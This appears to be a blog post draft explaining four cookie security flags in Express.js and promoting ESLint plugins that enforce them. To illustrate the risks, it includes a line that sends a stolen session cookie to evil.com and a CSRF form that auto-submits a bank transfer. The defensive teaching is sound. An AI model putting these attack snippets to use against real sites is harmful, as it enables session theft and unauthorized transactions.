---
title: 'Cookie Security: The 4 Flags You Must Always Set'
published: false
description: 'Missing httpOnly, secure, sameSite, or path on cookies? Here is why each flag matters and how ESLint enforces them.'
tags: javascript, security, cookies, eslint
cover_image:
series: Browser Security
---

# Cookie Security: The 4 Flags You Must Always Set

```javascript
res.cookie('session', token);
```

This cookie is **vulnerable to every cookie attack**.

## The 4 Required Flags

| Flag       | Without It                      | Attack             |
| ---------- | ------------------------------- | ------------------ |
| `httpOnly` | JavaScript can read cookie      | XSS steals session |
| `secure`   | Sent over HTTP                  | Network sniffing   |
| `sameSite` | Sent with cross-origin requests | CSRF attacks       |
| `path`     | Sent to all paths               | Path confusion     |

## Flag #1: httpOnly

```javascript
// ❌ JavaScript accessible
res.cookie('session', token);

// Attacker script:
document.cookie; // Contains your session!
fetch(`https://evil.com?session=${document.cookie}`);
```

```javascript
// ✅ JavaScript cannot access
res.cookie('session', token, { httpOnly: true });

// document.cookie returns empty for this cookie
// XSS cannot steal the session
```

## Flag #2: secure

```javascript
// ❌ Sent over HTTP
res.cookie('session', token);

// On public WiFi:
// Attacker intercepts HTTP traffic → Reads cookie
```

```javascript
// ✅ HTTPS only
res.cookie('session', token, { secure: true });

// Cookie never sent over unencrypted connection
```

## Flag #3: sameSite

```javascript
// ❌ Sent with cross-origin requests
res.cookie('session', token);

// Attacker's page:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
// Cookie sent! Transfer executed!
```

```javascript
// ✅ Not sent cross-origin
res.cookie('session', token, { sameSite: 'strict' });

// Cross-origin request? Cookie not included.
```

### sameSite Options

| Value    | When Cookie Sent                   |
| -------- | ---------------------------------- |
| `strict` | Same-origin only                   |
| `lax`    | Same-origin + top-level navigation |
| `none`   | All requests (requires `secure`)   |

## Flag #4: Path & Expiration

```javascript
// ❌ No expiration = session cookie (sometimes wanted)
// ❌ No path = all paths
res.cookie('admin_session', token);

// Better: Scoped path and explicit expiration
res.cookie('admin_session', token, {
  path: '/admin', // Only sent to /admin/*
  maxAge: 1800000, // 30 minutes
  expires: new Date(Date.now() + 1800000),
});
```

## The Complete Pattern

```javascript
// ✅ All security flags
res.cookie('session', token, {
  httpOnly: true, // No JavaScript access
  secure: true, // HTTPS only
  sameSite: 'strict', // No cross-origin
  path: '/', // Explicit path
  maxAge: 3600000, // 1 hour
  domain: 'example.com', // Explicit domain
});
```

## Express.js Session Example

```javascript
import session from 'express-session';

app.use(
  session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 24 * 60 * 60 * 1000, // 24 hours
    },
  }),
);
```

## ESLint Rules

```javascript
// eslint.config.js
import browserSecurity from 'eslint-plugin-browser-security';

export default [
  {
    rules: {
      'browser-security/require-cookie-secure-attrs': 'error',
      'browser-security/no-sensitive-cookie-js': 'error',
    },
  },
];
```

### For Express specifically

```javascript
import expressSecurity from 'eslint-plugin-express-security';

export default [
  {
    rules: {
      'express-security/no-insecure-cookie-options': 'error',
    },
  },
];
```

### Error Output

```bash
src/auth.ts
  25:1  error  🔒 CWE-614 CVSS:5.3 | Cookie missing security flags
               Missing: httpOnly, secure, sameSite
               Risk: Session hijacking via XSS or network interception
               Fix: Add { httpOnly: true, secure: true, sameSite: 'strict' }
```

## Quick Reference Table

```javascript
// Authentication cookie
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000,
});

// User preference (non-sensitive)
res.cookie('theme', 'dark', {
  // httpOnly: false is OK, JavaScript needs to read it
  secure: true,
  sameSite: 'lax',
  maxAge: 31536000000, // 1 year
});

// CSRF token
res.cookie('csrf', csrfToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000,
});
```

## Quick Install

{% cta https://npmjs.com/package/eslint-plugin-browser-security %}
📦 npm install eslint-plugin-browser-security
{% endcta %}

```javascript
import browserSecurity from 'eslint-plugin-browser-security';
export default [browserSecurity.configs.recommended];
```

---

📦 [npm: eslint-plugin-browser-security](https://www.npmjs.com/package/eslint-plugin-browser-security)
📖 [Rule: require-cookie-secure-attrs](https://github.com/ofri-peretz/eslint/tree/main/packages/eslint-plugin-browser-security/docs/rules/require-cookie-secure-attrs.md)

{% cta https://github.com/ofri-peretz/eslint %}
⭐ Star on GitHub
{% endcta %}

---

🚀 **Check your cookies in DevTools. Missing any flags?**

[GitHub](https://github.com/ofri-peretz) | [LinkedIn](https://linkedin.com/in/ofri-peretz)
